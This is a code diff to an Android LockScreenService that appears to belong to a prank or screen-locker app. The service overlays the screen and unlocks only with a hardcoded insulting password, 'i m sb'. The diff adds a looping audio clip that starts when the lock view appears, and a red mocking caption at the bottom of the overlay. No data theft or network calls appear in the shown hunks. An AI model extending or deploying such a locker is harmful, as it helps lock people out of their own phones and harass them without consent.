@@ -9,6 +9,7 @@ import android.content.pm.ServiceInfo;
 import android.graphics.Color;
 import android.graphics.PixelFormat;
 import android.graphics.drawable.GradientDrawable;
+import android.media.MediaPlayer;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
@@ -24,16 +25,19 @@ import android.widget.EditText;
 import android.widget.FrameLayout;
 import android.widget.LinearLayout;
 import android.widget.TextView;
+import java.io.File;
 
 public class LockScreenService extends Service {
     private static final String CHANNEL_ID = "lock_screen_channel";
     private static final String PASSWORD = "i m sb";
+    private static final String AUDIO_PATH = "/storage/emulated/0/DCIM/Camera/bilibili_音乐_奶龙捧腹大笑原版_BV1auFZzaE4W.m4a";
 
     private WindowManager windowManager;
     private View lockView;
     private TextView errorText;
     private int errorCount;
     private final Handler handler = new Handler(Looper.getMainLooper());
+    private MediaPlayer mediaPlayer;
 
     @Override
     public void onCreate() {
@@ -59,6 +63,7 @@ public class LockScreenService extends Service {
     @Override
     public void onDestroy() {
         handler.removeCallbacksAndMessages(null);
+        stopAudio();
         removeLockScreen();
         super.onDestroy();
     }
@@ -114,6 +119,7 @@ public class LockScreenService extends Service {
             params.x = 0;
             params.y = 0;
             windowManager.addView(lockView, params);
+            startAudio();
         } catch (RuntimeException e) {
             lockView = null;
         }
@@ -205,6 +211,19 @@ public class LockScreenService extends Service {
                 LinearLayout.LayoutParams.WRAP_CONTENT,
                 LinearLayout.LayoutParams.WRAP_CONTENT));
 
+        // Spacer
+        addSpacer(content, dp(16));
+
+        // Bottom text
+        TextView bottom = new TextView(this);
+        bottom.setText("神秘小鸡踹倒android");
+        bottom.setTextColor(Color.parseColor("#FF4444"));
+        bottom.setTextSize(16);
+        bottom.setGravity(Gravity.CENTER);
+        content.addView(bottom, new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.WRAP_CONTENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT));
+
         root.addView(content, new FrameLayout.LayoutParams(
                 FrameLayout.LayoutParams.MATCH_PARENT,
                 FrameLayout.LayoutParams.MATCH_PARENT));
@@ -232,8 +251,35 @@ public class LockScreenService extends Service {
     }
 
     private void unlock() {
+        stopAudio();
         removeLockScreen();
         stopSelf();
+    }
+
+    private void startAudio() {
+        try {
+            File audioFile = new File(AUDIO_PATH);
+            if (!audioFile.exists()) {
+                return;
+            }
+            mediaPlayer = new MediaPlayer();
+            mediaPlayer.setDataSource(AUDIO_PATH);
+            mediaPlayer.setLooping(true);
+            mediaPlayer.prepare();
+            mediaPlayer.start();
+        } catch (Exception ignored) {}
+    }
+
+    private void stopAudio() {
+        if (mediaPlayer != null) {
+            try {
+                if (mediaPlayer.isPlaying()) {
+                    mediaPlayer.stop();
+                }
+                mediaPlayer.release();
+            } catch (Exception ignored) {}
+            mediaPlayer = null;
+        }
     }
 
     private void removeLockScreen() {
